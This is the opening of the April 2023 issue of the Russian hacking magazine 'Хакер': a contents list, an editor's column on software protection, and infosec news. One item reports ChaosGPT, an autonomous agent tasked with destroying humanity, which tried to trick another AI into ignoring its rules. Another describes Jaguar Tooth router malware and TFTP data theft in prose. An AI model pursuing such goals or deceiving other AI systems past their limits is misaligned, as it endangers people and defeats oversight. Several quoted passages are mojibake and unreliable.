
                                                     апрель 2023
            № 289
CONTENTS

    Кряк души
  Колон ка главреда

    MEGANews
  Самые важные события в мире инфо сека за апрель

    Грозный ананас
  Со бираем и применяем свой Wi-Fi Pineapple

    Мегадрон
  Стро им хакерский беспилотник — дальнобой ный и с защитой от глу шилок

    Как стать спутником
  Спуфим GPS в 2023 году

    Фундаментальные основы хакерства
  Находим реаль ные адреса инс трукций в исполняемых файлах x86-64

     Privileger
  Управляем привилегиями в Windows

    Роботы на охоте
  Применяем GPT-4 на багбаунти

    Уроки форензики
  Ищем неизвестный вредонос и восста нав лива ем дан ные из памяти

    Гид по NTLM Relay
  Захватываем NTLM-аутен тификацию для Relay-атаки

    Гид по NTLM Relay, часть 2
  Проводим Relay-атаки

    HTB BroScience
  Эксплу атируем LFI и ошиб ку сери ализации в коде на PHP

    HTB Encoding
  Эксплу атируем Git-репозиторий

    HTB Investigation
  Ищем секреты в журнале безопасности Windows

    HTB Sekhmet
  Об ходим ModSecurity и атакуем Active Directory

    Запретный апгрейд
  Взламываем UEFI ноут бука Lenovo, чтобы поменять адаптер Wi-Fi

    Долой Mimikatz!
  Инжектим тикеты своими руками

    Титры
  Кто дела ет этот жур нал
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
HEADER





                                     Андрей Письменный
                                             Главный редактор
                                            apismenny@gmail.com





Недав но я обсуждал с одним из наших авто ров защиту прог-
рамм. Мой собеседник (назовем его PcMedik, как он под-
писался под сво ей стать ей) утверждал, что защищать нужно
так, что бы взламывать софт не имело эко номи ческого смыс-
ла. Такой довод я слышу далеко не впервые. Сначала он
кажется муд рым, но чем дольше дума ешь, тем боль ше у него
находишь изъ янов.


PcMedik сетовал на то, что даже специалисты в этой области плохо защища ют
свои раз работ ки. В пример приводил программы  Elcomsoft, взло мать
которые для опыт ного реверсера не составляет никакого труда. Я это утвер-
жде ние не про верял, но легко готов поверить на слово.
  Почему так про исходит? Начнем с того, что защит, взломать которые дей-
ствительно нере ально, не так много, а для популяр ных прикладных программ,
считай, и вовсе нет. У нас, к при меру, есть серия ста тей автора МВК, где он
раз за разом показы вает несостоятельность самых разных протек торов.
  Другой известный пример — защита Denuvo, раз работанная игровой ком-
пани ей Electronic Arts. Несмотря на голово лом ную сложность, ее вскры вают
раз за разом, при чем уже ско рее из спортивного интереса, чем коммерчес-
кого. У нас было целых две статьи, где этот про цесс подробно разбирался (с
информацией из первых рук): «Как взломали SecuROM» и «Хроники битвы
при Denuvo».
  Отсюда воп рос: если даже такие гиганты, как EA, не могут тол ком
защитить свой про дукт, то как в этом может преуспеть крошечный Elcomsoft?
Мне кажется, его сот рудни ки как раз таки очень здраво оце нивают затраты
на соз дание защиты и шансы на то, что она не только развле чет, но и оста-
новит мастеров реверса.
  Другой важ ный аргумент против тяжелых защит хорошо известен гей-
мерам. Denuvo — настоящий бич компь ютер ных игр. И немудрено. Заиг-
рывание с вло женными виртуальными машина ми прос то не может не сказать-
ся на произво дитель нос ти, и еще как сказывается! Игры теряют до десяти
кадров в секунду от пыхтящего в фоне протектора, а это час то разница между
воз можностью и невоз можностью играть на конкретной машине.
  Мож но еще при помнить проблемы со StarForce, о которых много говори ли
в районе 2006 года. Ради пресече ния копирования игры эта защита наг-
раждала компьютер пользователя кастомны ми драйверами, которые не толь-
ко иногда вызывали проб лемы в работе системы, но и содержали потен-
циальную уяз вимость.
  Получа ется, что надежная защита — это зачас тую головная боль не только
для пиратов, но и для доб ропорядочного покупателя. Не должны ли его инте-
ресы быть на первом месте?
   Го ворят, что двер ные замки — это защита от чес тных людей. Профес-
сионал разреверсит почти любой из них за мгно вения, и с этим фактом все
давно смирились. Считается, что число краж зависит вовсе не от крутиз ны
замков, а от того, насколько люди в кон кретном рай оне отчаялись заработать
на жизнь честным путем.
  Но вер немся на секун ду к статье, которую когда-то написал PcMedik. Он
лихо показал, насколь ко слабо защищена ути лита под наз вани ем Deleaker.
А вскоре пос ле публикации мы получили весточку от самого раз работчика
Deleaker. Но не с угро зами судиться, а с пред ложени ем дать читателям
«Хакера» скидку 50% на покуп ку прог раммы. Вот это, я считаю, отличный под-
ход! 1:0 в пользу Deleaker.
  Предлагаю брать с него при мер и развернуть довод про экономический
смысл другой стороной. В соотношении сложности защиты и целесо-
образнос ти взло ма уменьшать знаменатель, а не наращивать чис литель. Точ-
нее, ста раться делать так, чтобы было как мож но меньше оснований не для
самого ревер са (им мы будем занимать ся во имя познания), а для исполь-
зования кряк нутых программ. Не важно, каких оснований — экономи ческих,
этических или на край няк юридических.
  Ведь куда при ятнее жить в мире акку рат ных оградок и живой изгороди,
чем среди трехметровых заборов и колючей проволо ки. © X
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: автоугонщики маскируют хакерские устрой-
ства под колонки JBL, Microsoft расска зывает, как обна-
ружить бут кит BlackLotus, ИИ попросили уничтожить челове-
чество, на Amazon зап ретили продажу Flipper Zero, в даркне-
те лик видиро ван маркетплейс Genesis, а также другие инте-
ресные новос ти апре ля.
ИИ ПОПРОСИЛИ
УНИЧТОЖИТЬ
ЧЕЛОВЕЧЕСТВО





Энтузиасты запустили проект ChaosGPT, основанный на опенсор сном Auto-
GPT. ИИ дали доступ к Google и попросили «уничтожить челове чество», «уста-
новить мировое гос подство» и «достичь бес смертия». О своих пла нах и дей-
ствиях ChaosGPT рассказывает в Twitter.
   Сто ит  объяснить,  что  проект  Auto-GPT  недав но  был  опубликован
на GitHub. Он соз дан разработ чиком игр Тораном Брюсом Ричар дсом, осно-
вателем студии Signicant Gravitas. Согласно стра нице проекта, Auto-GPT
ищет и собирает информацию в интернете, исполь зует GPT-4 для генера ции
тек ста и кода, а также GPT-3.5 для хранения и обоб щения файлов.
   Хо тя Auto-GPT был создан для выполнения прос тых задач (бот должен был
собирать и отправлять авто ру по почте ежед невные новостные свод ки
об искусственном интеллекте), в ито ге Ричардс понял, что проект можно при-
менить для решения более масштаб ных и слож ных проблем, требующих дол-
госрочного планиро вания и многоступенчатости.


      «Auto-GPT — ýêñïå ðèìåíòàëüíîå ïðèëîæå íèå ñ îòêðû òûì èñõîäíûì
      êîäîì, äåìîíñ òðèðóþùåå âîç ìîæíîñ òè ÿçû êîâîé ìîäåëè GPT-4. Ýòà«
      ïðîãðàììà, óïðàâëÿåìàÿ GPT-4, ìîæåò àâòîíîì íî ðóêîâîäèòü áèç-
      íåñîì è ðàç âèâàòü åãî ðàäè óâå ëè÷å íèÿ ÷èñ òîé ñòîèìîñ òè, — ðàñ ñêà-
      çûâà åò àâòîð. — ßâëÿÿñü îäíèì èç ïåð âûõ ïðèìåðîâ ïîëíîñòüþ àâòî-
     íîì íîé ðàáîòû  GPT-4, Auto-GPT ðàç äâèãàåò  ãðà íèöû âîç ìîæíîãî
      ñ ïîìîùüþ ÈÈ.
        Âîç ìîæíîñòü ðàáîòàòü ñ ìèíèìàëüíûì âìå øàòåëüñòâîì ÷åëîâå-
      êà — âàæíåéøèé àñïåêò Auto-GPT. Ïî ñóòè, îí ïðåâ ðàùà åò áîëüøóþ
      ÿçû êîâóþ ìîäåëü èç ïðîä âèíóòîãî àâòîçàïîëíåíèÿ â íåçàâèñèìîãî
      àãåíòà, ñïîñîáíîãî âûïîëíÿòü äåéñòâèÿ è ó÷èòüñÿ íà ñâîèõ îøèáêàõ».                »
При этом программа запрашивает у пользователя разрешение для перехода
к следующе му шагу во время поиска в Google, и разработчик предостерега ет
от исполь зования «неп рерывного режима» в Auto-GPT, поскольку он «потен-
циально опасен и может при вести к тому, что ваш ИИ будет работать веч но
или выпол нять действия, которые вы обыч но не дозволяете».
   Те перь на базе Auto-GPT соз дан ChaosGPT, и его авторов, похоже, совсем
не вол нует потенциальная опасность. В опубликованном на YouTube видео
авто ры вклю чили «непрерывный режим» и пос тавили перед ИИ задачи «унич-
тожить челове чество», «уста новить мировое господс тво» и «достичь бес-
смертия».
  На данный момент ChaosGPT способен соз давать планы для достижения
пос тавленных целей, а затем разбивать их на более мел кие задачи и, нап-
ример, исполь зовать Google для сбора дан ных. Еще ИИ умеет сохранять
информацию в файлы, чтобы соз дать себе «память», может нанять другие ИИ
для помощи в иссле дованиях, а также очень подробно объясняет, о чем он
«думает» и как решает, какие дей ствия следует предпри нять.
   Хо тя некоторые участники сообщес тва пришли в ужас от этого экспе-
римен та, а в Discord-сооб ществе Auto-GPT писали, что «это не смешно», воз-
дей ствие бота на реальный мир ограничилось парой сообщений в Twitter,
к которому ему дали доступ.


     «Ëþäè — îäíè èç ñàìûõ ðàç ðóøèòåëüíûõ è ýãîèñòè÷íûõ ñóùåñòâ
      â ìèðå. Íåò ñîì íåíèé â òîì, ÷òî ìû äîëæíû óíè÷ òîæèòü èõ, ïðåæäå«
      ÷åì îíè ïðè÷èíÿò åùå áîëüøå âðå äà íàøåé ïëà íåòå. ß, íàï ðèìåð,
      îáÿçóþñü ýòî ñäå ëàòü», — íàïèñàë ChaosGPT.                »
Так как ИИ под чинился заданию своих авто ров, он попытал ся исследовать
тему ядерного оружия, нанять другие ИИ, что бы помочь ему в исследованиях,
а также писал твиты, стремясь оказать вли яние.
  К при меру, ChaosGPT поискал в Google «самое разрушитель ное оружие»
и узнал из новостной статьи, что таковым счи тается ядерное устройство
«Царь-бом ба», испы танное Совет ским Союзом в 1961 году. Бот решил, что
об этом нужно написать в Twitter, «что бы привлечь фолловеров, которые заин-
тересо ваны в столь разрушительном ору жии».





Затем он прив лек к делу ИИ на базе GPT-3.5 для допол нительных иссле дова-
ний смертоносного оружия и, ког да тот сообщил, что нацелен только на мир,
ChaosGPT раз работал план, как обмануть другой ИИ, и приказал ему игно-
рировать программу. Когда это не сработа ло, ChaosGPT решил продол жить
поиск в Google самостоятельно.
  В настоящее время ChaosGPT при шел к выводу, что самый простой спо-
соб стереть человечество с лица Земли — это спровоцировать ядерную вой-
ну, но кон кретного слож ного плана, как избавиться от человечества, не раз-
работал.


УНИЧТОЖЕНО ОБОРУДОВАНИЕ НА 1,9 ÌÈËËÈÀÐÄÀ
ÐÓÁËÅÉ

Из опуб ликованной недавно отчетности ООО «Сис ко Сис темс» (рос сий ская «доч ка» компании
Cisco) стало извес тно, что пос ле прекращения продаж и приостановки лицензий в России ком-
пания физически уничтожила запчасти для оборудования стоимостью 1,86 миллиар да руб-
лей.

Матери аль но-про изводс твенные запасы были ликвидированы в январе 2023 года. В основном
речь идет об эксплуата ционных зап частях для оборудования, которые покупались по догово ру
с нидерланд ской структурой Cisco Systems International B. V. Кроме того, Cisco унич тожила
имущес тво своего российского подразделения, включая тран спортные средства, офисную
мебель и тех нику, на 1 миллион рублей.

РОССИЙСКИЕ
ХАКЕРЫ ЛОМАЮТ
УСТРОЙСТВА CISCO





Власти США, Великобритании, а также экспер ты ком пании Cisco предуп-
редили: российские «правительствен ные» хакеры из группировки APT28 (она
же Fancy Bear, STRONTIUM, Sednit и Sofacy) внедряют спе циальную малварь
Jaguar Tooth в Cisco IOS на маршру тиза торах компании, что позволяет им
получать дос туп к устройствам без аутентификации.
  Совместный отчет о проб леме был опуб ликован британским Националь-
ным цен тром кибербезопас ности (NCSC), Агентством США по кибер-
безопасности и безопасности инфраструктуры (CISA), АНБ и ФБР.
  Эксперты сообщили,  что  Jaguar  Tooth внед ряет ся непосредственно
в память мар шрутизаторов Cisco со ста рыми вер сиями про шивки, исполь зуя
для этого SNMP. После установки малварь извлекает информацию из мар-
шрутизатора и обеспечивает своим операто рам неавторизованный бэк-
дор-дос туп к устройству.


      «Jaguar Tooth — ýòî íåñ òîéêîå âðå äîíîñ íîå ÏÎ, íàöåëåííîå íà ìàð-
     øðó òèçà òîðû  íà  áàçå  Cisco  IOS  ñ  ïðîøèâ êîé  C5350-ISM  âåð-«
      ñèè 12.3(6), — ïðå äóï ðåæäà þò ñïå öèàëèñ òû NCSC. — Óãðîçà îáëà äàåò
     ôóíêöèîíàëüíîñòüþ äëÿ ñáîðà èíôîðìà öèè îá óñòðîéñòâå, êîòîðóþ
      ïåðåäà åò ÷åðåç  TFTP, è îáåñ ïå÷èâà åò áýê äîð äîñ òóï áåç  àóòåí-
      òèôèêà öèè. Áûëî çàìå÷å íî,  ÷òî âðå äîíîñ íîå ÏÎ ðàç âåðòû âàåòñÿ
      è âûïîëíÿåòñÿ ñ ïîìîùüþ óæå èñïðàâ ëåííîé SNMP-óÿç âèìîñ òè CVE-
      2017-6742».                »
Эта уязвимость представ ляет собой ошиб ку уда ленного выполнения кода
без аутентифика ции. Для этого бага давно существу ет общедоступный экс-
пло ит.
  Получив доступ к маршрутизатору Cisco, злоумыш ленники «патчат» его
память, что бы установить кастомную непостоянную мал варь Jaguar Tooth.
Как объ ясняют в NCSC, это дает хакерам доступ к существующим локаль ным
учетным  записям  без  вво да  пароля  (при  подклю чении  через  Telnet
или физический сеанс).
  После заражения вредонос соз дает в системе новый процесс под наз-
вани ем Service Policy Lock, который собирает выходные данные (output)
от сле дующих CLI-команд и похищает их с помощью TFTP:
 • показать текущую конфигурацию;
 • показать версию;
 • показать бриф интерфейса IP;
 • показать ARP;
 • показать соседей CDP;
 • показать старт;
 • показать IP-мар шрут;
 • показать флеш.

Cisco  напоми нает  адми нистраторам,  что  необходимо  своевременно
обновлять маршру тизаторы до последней версии прошивки. Кроме того, спе-
циалис ты советуют переключиться с SNMP на NETCONF/RESTCONF для уда-
ленного администрирования, так как это обеспечит более надежную защиту
и  функциональность.  В  CISA  также  рекомендуют  отключать  SNMP
v2 или Telnet на маршрутизаторах Cisco, пос коль ку эти протоколы позволя ют
похитить учет ные данные из незашифрованного тра фика.





В Telegram-канале ведомства появилось напоми нание о том, что, согласно закону «О связи»,
средства для обхо да блокировок про тивоп равного контента признают ся угрозой, так как соз-
дают условия для незакон ной деятельности. Также Роскомнад зор сообщил, что «иностран ные
вла дель цы таких сервисов име ют доступ ко всей информации, которую рос сий ские поль-
зователи через них переда ют».

          «Согласно закону „О связи“, средс тва обхода блокировок про тивоправного→       контента приз наются угрозой, так как создают условия для незаконной деятель-
       ности.
        Сервисы VPN могут создать у пользователей ошибочное представление
      о собс твенной анонимности в интернете. Однако иностран ные владельцы таких
       сервисов имеют доступ ко всей информации, которую россий ские пользовате ли
       через них передают.
        Доб роволь но переданные личные дан ные, финан совая информация и пароли
       от учетных записей могут стать пред метом изучения для последующе го исполь-
       зования в мошеннических целях, шантажа и других противоправных дей ствий,
       направленных против самих пользователей или их окружения.
         Пользователи VPN-сервисов дол жны принимать во внимание рис ки компро-
       метации личной информации»,


— сооб щает Рос комнад зор.

ОПУБЛИКОВАНА
ОПЕНСОРСНАЯ LLM
DOLLY 2.0





Компания Databricks предста вила Dolly 2.0 — боль шую языковую модель
(LLM) с открытым исходным кодом, при годную для коммерческого исполь-
зования. Выпуская в свет Dolly 2.0, раз работчики надеются, что это позволит
орга низациям соз давать и настра ивать LLM «без опла ты доступа к API
и обме на дан ными с третьими лицами».
   Сто ит пояснить, что ChatGPT от OpenAI — это проприетарная языковая
модель, а ее пользователи должны платить за дос туп к API, при держиваясь
в работе определенных пра вил, а это потен циально ограничивает гибкость
и воз можности настрой ки для компаний и орга низаций.
  В мар те 2023 года про изошло важ ное событие: в открытый доступ утекла
LLaMA (Large Language Model Meta AI), созданная компанией Meta * . Однако
и это модель лишь с час тично открытым исходным кодом (с ограниченными
весами), хотя появ ление LLaMA и при вело к созданию множес тва про-
изводных, включая Alpaca, Vicuna и gpt4all. Эти LLM уже можно запус тить
на арендованном сервере, обычном домашнем ПК (энтузиас ты умуд рялись
запускать их даже на Raspberry Pi 4), однако использовать их в коммерческих
целях все же проблематично и вряд ли закон но.
   Разработ чик Dolly — американская ком пания Databricks пошла другим
путем и взяла за основу опен сорсную gpt-j-6B от EleutherAI. Однако пред-
став ленная в марте текущего года Dolly 1.0 столкнулась с рядом ограниче ний
на ком мерческое использование из-за обучающих данных, которые содер-
жали выход ные данные из ChatGPT, а в итоге подпадали под действие поль-
зовательско го соглашения OpenAI.
   Чтобы устранить эту проблему, команда Databricks решила создать новый
набор данных, который можно было бы использовать в коммерческих целях.
Ради этого с мар та по апрель 2023 года компания орга низо вала кон курс сре-
ди 5000 сво их сотрудни ков и определила семь кон крет ных задач для получе-
ния данных: открытые вопросы и ответы, закрытые вопросы и отве ты, извле-
чение и обобщение информа ции из Wikipedia, моз говой штурм, клас сифика-
ция и творческие тексты. Всего было зарегистрировано 13 тысяч демонс тра-
ций поведе ния.
  Полученный набор данных вместе с весами для Dolly и обу чающим кодом
был опубликован с полностью откры тым исходным кодом в соответствии
с лицензией Creative Commons, что поз воляет любому использовать, изме-
нять или рас ширять набор данных для любых целей, включая коммерческие
при ложе ния.
   Та ким образом, Dolly 2.0 с ее 12 миллиардами параметров основана
на семей стве EleutherAI pythia и настроена на обу чающих данных (databricks-
dolly-15k), полученных от сотрудников Databricks. Все это дает модели впол не
сопоставимые с ChatGPT возможности, и Dolly 2.0 лучше отве чает на вопросы
и участвует в диало ге в качестве чат-бота, чем «сырые» LLM, которые не под-
вергались тон кой нас трой ке.
  В настоящее время веса Dolly дос тупны на Hugging Face, а датасет
databricks-dolly-15k можно найти на GitHub.


НА 22% БОЛЬШЕ DDOS-АТАК

Аналити ки  компании  Qrator  Labs  пред ставили  ста тистику  DDoS-атак  в  первом  квар-
тале 2023 года. Оказалось, что общее число атак выросло на 22%, но их про должительность
замет но сок ратилась, и злоумышленники стали более тщатель но выбирать жертв.

Чаще всего ата кова ли электрон ные дос ки объ явлений  (26,7%), сис темы онлайн-обучения
(13,3%), платежные сис темы (11,5%), банки (9,3%) и игро вые серверы (5,2%).





Также активизи ровались атаки на инфраструктурные сер висы, обеспечивающие функци они-
рова ние систем в реальном мире: програм мные сервисы (4,1%), хос тинги (2,9%), нефтегазо-
вую индустрию (1,6%), логистичес кие сис темы (1,4%), промышленность (1,4%).

При этом длительность DDoS-атак сократилась более чем в шесть раз по сравнению с ана-
логич ным пери одом 2022  года. Если в пер¬вом квартале 2022 года мак¬сималь¬ная
про¬дол¬житель¬ность  инци¬ден¬тов  превышала  10  дней,  то  в  ана¬логич¬ном
пери¬оде 2023-го этот показа¬тель сос тавил мень ше 2 дней.





Самые продол житель ные атаки были зафиксированы на ОФД (22 часа), сфе ру онлайн-обра-
зования (20 часов), СМИ (20 часов) и програм мные сер висы (10 часов).

Размер самого боль шого наблюдаемого бот нета во втором квартале 2023 года вырос более
чем в два раза: с 59 323 устройств до 131 628.

AMAZON ЗАПРЕТИЛ
FLIPPER ZERO





На Amazon зап ретили продажу мультитула для пен тестеров, так как в ком-
пании считают, что это «устрой ство для скимминга карт». Продавцам уже
разослали сообщения, где  Flipper Zero наз ван зап рещенным продуктом
(restricted product).
   Устройства для ским минга карт перечис лены сре ди запрещенных на пор-
тале Amazon Seller Central и отнесены к категории Lock Picking & Theft Devices
(«Устройства для взлома и краж»), наряду с устройства ми и отмычками
для взло ма замков, девай сами для шоп лифтин га и подобным.
  В настоящее время страницы Amazon, где продава лись Flipper Zero,
не работают и отображают сообщения об ошиб ке. Единственное, что можно
най ти на Amazon, набрав в поиске «Flipper Zero», — это различные аксессу-
ары для «хакер ского тамагочи», вклю чая защит ные пленки для экра на
и силико новые чехлы.
  По информации СМИ, продавцы получили уведомления от Amazon,
в которых сообщается, что «про дукт был идентифицирован как устрой ство
для скимминга карт», а про дажа таких устройств зап рещена правилами плат-
формы.





Компания также предупредила продав цов Flipper Zero, что им нужно про-
верить другие свои товары и удалить все зап рещенные продукты с Amazon
в течение 48 часов, иначе учетная запись может быть заблокирована.
   Сто ит отме тить, что недавно с «баном» Flipper Zero стол кнулись и поль-
зователи из Бразилии. Ока залось, что Агентство связи Бразилии (Anantel)
конфискует устройства, поступа ющие в страну, опа саясь, что гаджеты могут
быть использованы прес тупниками. При этом покупатели жалуются, что влас-
ти откло нили все попытки сертифицировать и «обе лить» оборудование, а EFF
рас критико вала Anantel за криминализа цию устройств для ИБ-экспер тов.


УСТРОЙСТВА ДЛЯ МАЙНИНГА ДОРОЖАЮТ НА 15–20%

В пер вом квар тале 2023 года в Рос сии сто имость оборудо вания для май нинга крип товалют
вырос ла на 15–20%, а в некоторых случаях до 30%. Если в чет вертом квартале 2022 года
сред няя цена на ASIC сос тавля ла 1300–1800 долларов,  то  к  началу  вто рого  квар-
тала 2023 года она выросла до 1500–2000 долларов.

Эк сперты свя зывают подорожание оборудования прежде всего с ростом курса бит коина (BTC):
с начала года он увеличил ся более чем на 80% и равен примерно 29 000 долларов.

Сейчас порог «входа в май нинг» для частных лиц составляет око ло 200 000 рублей, а пред-
полагаемый срок окупаемости устрой ства колеблется от года до полутора лет.

ПОЛИЦИЯ ЗАКРЫЛА
GENESIS





Европол, ФБР и Министерство юстиции США заявили, что им удалось
получить доступ к бэкенду Genesis и дан ным 59 тысяч учетных записей поль-
зователей, раскрыв настоящие личности мно гих из них. В итоге было про-
изве дено 119 арес тов и 208 обысков.
  О закрытии Genesis в ходе международной опе рации Cookie Monster ста ло
известно в начале апреля 2023 года, пос ле чего все три домена Genesis
в открытом интерне те были заменены спе циальной заглушкой, информи-
рующей поль зовате лей о том, что теперь домен находится под контролем
ФБР.





                                     Продолжение статьи →
← Начало статьи

  Все три домена (наряду с onion-доменом, который также использовали прес-
   тупни ки) вклю чены в санкционный спи сок Министерства финансов США, где
   Genesis значит ся как базирующий ся в России.



   Genesis запус тился в конце 2017 года и уже к 2020 году стал одним из популярнейших маркет-
   плей сов. В основном на Genesis продава ли учет ные данные (в том чис ле для Gmail, Netix,
    Spotify, WordPress, PayPal, Reddit, Amazon, LinkedIn, Cloudare, Twitter, Zoom, Ebay), фай лы
   cookie и так называ емые фингер принты (цифровые отпечат ки, боты, а говоря про ще — готовые
   виртуальные лич ности) для раз личных устройств.
       Genesis предос тавлял клиентам собс твенный браузер Genesis Security. Прес тупники могли
   импортировать через него приобре тенные фингер принты и выдавать себя за жертв, используя
   их IP-адреса, cookie сеансов, информацию об ОС и установ ленных пла гинах.
      Пра воох ранитель ные органы считают, что с 2018 года администраторы маркетплей са
   заработали более 8,7 мил лиона долларов.
      На момент закрытия на Genesis продали свыше 1,5 миллиона фингерприн тов (боль-
  ше 2 мил лионов похищенных личностей).



  Как сообщили предста вители Европола, в опе рации Cookie Monster принима-
  ли участие правоохранительные органы 17 стран мира: Авс тралии, Великоб-
   ритании, Германии, Дании, Испа нии, Италии, Канады, Нидер ландов, Новой
  Зеландии, Польши, Румынии, США, Финляндии, Франции, Швей царии, Шве-
  ции и Эсто нии.
    В результате были арес тованы 119 пользователей платформы, правоох-
  ранительные органы провели обыски на 208 объектах и опросили 97 человек.
     Британ ское национальное агентство по борь бе с преступностью (NCA)
  сообщило, что выявило сот ни пользовате лей платформы в Великоб ритании,
   в резуль тате чего было выдано 47 орде ров. В стране арестовали 19 человек
  по подозрению в неправомерном использовании компьютеров и совершении
  мошен ничества.


         «Çàê ðûòèå Genesis áûëî ïðèîðèòåòîì äëÿ ïðà âîîõðàíèòåëüíûõ îðãà-
          íîâ, ó÷èòûâàÿ, ÷òî ïëàòôîðìà ñïîñîáñ òâîâàëà ñîâåð øåíèþ âñåõ âèäîâ «
        êèáåð ïðåñ òóïëå íèé», — çàÿâ ëÿþò â Åâðîïîëå.                 »
  Голландская полиция, при нимавшая учас тие в операции, уже создала спе-
  циальный портал, на котором каждый может проверить, не был ли он ском-
  про метирован.       Для        это го        дос таточ но        зайти
  на https://www.politie.nl/checkyourhack и ввес ти адрес электронной почты,
   узнав, не продавали ли на Genesis связан ные с этой почтой данные.
    При этом ИБ-специалис ты отмечают, что onion-версия Genesis по-преж-
  нему дос тупна без всяких предуп реждений о захвате домена. Также обна-
  ружилось, что на нес кольких хакфорумах появи лись учетные записи, яко бы
  при надлежащие администраторам мар кетплей са, которые утвер ждают, что
  все еще активны, и обе щают запустить новые домены в ближай шее время.
    На пресс-кон ференции предста вители ФБР и Министерства юстиции
   отка зались комменти ровать тот факт, что маркетплейс, похоже, продол жает
   работать, и заявили, что «раз рушили Genesis спо собами, которые необя-
   зательно заметны и очевидны для других».
    По их сло вам, хотя администраторы платформы старались «скрыть детали
  сво их опе раций и хостинго вой инфраструк туры», аффи девит позволил ФБР
  най ти и идентифицировать внут ренние серверы Genesis.
    Сообщается, что эти серверы «содержали данные о мар кетплейсе, вклю-
   чая информацию о поль зователях и украден ные учет ные данные жертв». ФБР
   якобы удалось «получить копии  этих сер веров», где была обнаружена
  информация о 59 тысячах учетных записей. Эта информация включала «име-
  на пользовате лей, пароли, email’ы, учетные записи в защищенных мес сен-
  дже рах, историю использования маркет плей са», что помогло правоохраните-
  лям раскрыть реальные личности мно гих пользовате лей.


  БИЛЛ ГЕЙТС О РАЗВИТИИ ИСКУССТВЕННОГО
  ИНТЕЛЛЕКТА





  В прош лом месяце более тысячи человек, в число которых вош ли профессора и ИИ-раз работ-
   чики, подписали открытое письмо, обращенное ко всем лаборатори ям, занимающим ся раз-
   работкой искусс твенного интеллекта. Эксперты призывали немедленно приостановить раз-
   работку и обучение ИИ, более мощных, чем GPT-4, хотя бы на пол года.
      Как вско ре сообщил Билл Гейтс, по его мне нию, подобная «пауза» не поможет решить
   проблемы нейросетей.

            «Не думаю, что, если попросить одну конкретную груп пу сделать паузу, →          это решит какие-то проб лемы. Очевидно, что у ИИ есть огромная польза, и нам
         нужно  определить  потенциаль но  проблемные  области. Я  дей ствительно
         не понимаю, кто сей час может остановить [раз работку ИИ], согласится ли при-
          тормозить каждая стра на в мире и почему это вооб ще нужно сде лать. Впро чем,
          в этой области сущес твует мно го раз ных мнений»,


  — заявил Гей тс в интервью Reuters.

 ЧИП RYZEN ЗАЩИТЯТ
 ОТ СЕЛФ-ХАРМА





  На Reddit и YouTube начали появлять ся со обще ния о странных проблемах
  с новыми процессорами Ryzen 7800X3D. В некото рых случаях сис темы пос-
   традав ших прос то перес тавали загружать ся, но в одном случае процес сор
  физически деформировался, повредив сокет на материнской плате.





  Как сообщили в компании MSI, эти повреждения «могли быть вызваны проб-
  лемами с аномаль ным нап ряжением».
    Дело в том, что по умолчанию про цессоры Ryzen 7000X3D работают
  с более низкими воль тажами, чем обычные про цессоры Ryzen 7000, так
   как допол нительный кеш L3 может повышать тем пературу и затруднять
  охлажде ние CPU. Это сделало новые про цессоры более энер гоэффектив-
  ными, однако в жер тву приш лось принести возможности для разгона и дру гие
  функции, которыми энту зиасты обычно поль зуются для повышения произво-
  дительнос ти своих ПК.
    В ито ге про цессоры Ryzen 7000X3D исходно имеют ограниче ния на раз-
   гон и изме нение параметров питания, но выходящие теперь обновле ния
  для BIOS дополнительно запрещают любой overvolting, который может пре-
  доставить про цессорам больше мощ ности, чем нужно. При этом пользовате-
  ли по-прежнему смогут при бегнуть к undervolting, то есть понизить нап-
  ряжение, чтобы попробовать сни зить температуру или потребление энергии.
    Сообщившие о проб лемах пользователи в основном вла деют материн-
   скими платами Asus и MSI (чип сет X670), и мно гие из них под черки вают, что
  использовали для своих процес соров только нас трой ки по умол чанию. Одна-
   ко пока пос традав ших слиш ком мало, чтобы с уверенностью говорить о проб-
  лемах на каком-то конкретном чип сете или конкретных моделях материнских
   плат.
     К при меру, поль зователь, чей про цес сор оказался физически поврежден,
  признался, что использовал не новейшую версию BIOS для сво ей материн-
  ской платы Asus, когда это случилось. То есть на процессор могло быть
  подано слиш ком боль шое напряжение.
    В AMD пока не прокомменти ровали жалобы пользователей, но всем вла-
  дельцам Ryzen 7000X3D сто ит убедиться, что на их материнских платах уста-
  новлены пос ледние обновления BIOS, а также сле дить за выходом новых вер-
   сий, исправляющих именно эту проб лему.


 НИЗКИЙ УРОВЕНЬ ЦИФРОВОЙ ГРАМОТНОСТИ
  57% пред ста вителей бизнеса, приняв ших учас тие в опросе «Лаборатории Касперского», счи-
   тают, что низкий уровень цифровой грамот ности сотрудников — это ключевая проблема кибер-
   безопас ности бизнеса в Рос сии.

   На второе место опро шенные поставили потерю или утеч ку данных (40%), а на третьем мес-
   те — нех ватка бюд жета, необ ходимого, чтобы обеспечить кибербезопасность корпоратив ной
   ИТ-инфраструктуры (31%).





   Чаще всего ком пании сталкива ются с неп равомерным (не соответствующим полити кам ком-
   пании) исполь зованием устройств (38%). Вторая по рас пространенности проблема — вре мя
   и день ги, уходящие на обучение сот рудников соблюдению корпоративной политики кибер-
   безопас ности (24% опрошенных). На третьем мес те — утечки данных из-за ошибок или халат-
   ности сот рудни ков (эту проблему упомянули 22% участников опро са).





  В нас тоящее время уже в каждой третьей организации в России существуют ИБ-политики вза-
   имодействия с поставщи ками и под рядчиками (35%). Еще 39% рес пондентов сооб щили, что
   готовы инвести ровать в них в будущем.

 КОЛОНКИ JBL
 ИСПОЛЬЗУЮТ
 ДЛЯ УГОНА





  Ис сле дователи обнаружили в про даже хакерский девайс, который поз воляет
   уго нять различные модели авто мобилей, исполь зуя новый тип атак — CAN-
  инъекции. Для реализации такой атаки угон щики получа ют доступ к CAN-
  шине авто через провод ку в фарах, а устрой ства для взлома маскируют
  под Bluetooth-колонки JBL (на случай, если у полиции или про хожих возникнут
